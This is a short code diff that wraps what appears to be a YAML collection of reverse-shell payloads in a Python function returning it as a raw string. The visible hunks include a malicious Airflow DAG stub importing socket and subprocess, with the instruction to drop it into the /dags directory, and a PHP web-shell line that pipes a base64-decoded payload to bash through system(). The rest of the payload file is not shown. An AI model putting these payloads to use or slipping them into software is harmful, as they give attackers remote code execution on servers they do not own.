@@ -1,3 +1,5 @@
+def output_yaml():
+    return r"""
 payload:
   py:
     - |
@@ -1505,7 +1507,7 @@ payload:
     - |
       => Save it as script.py and put into /dags directory
 
-      """Example DAG demonstrating the usage of the PythonOperator."""
+      [Example DAG demonstrating the usage of the PythonOperator.]
       from airflow import DAG
       import socket
       import subprocess
@@ -1661,3 +1663,4 @@ payload:
       <?php system("echo '{BASE64_PY3}' | base64 -d | bash"); ?>
 
       {PHP_LFI}
+"""
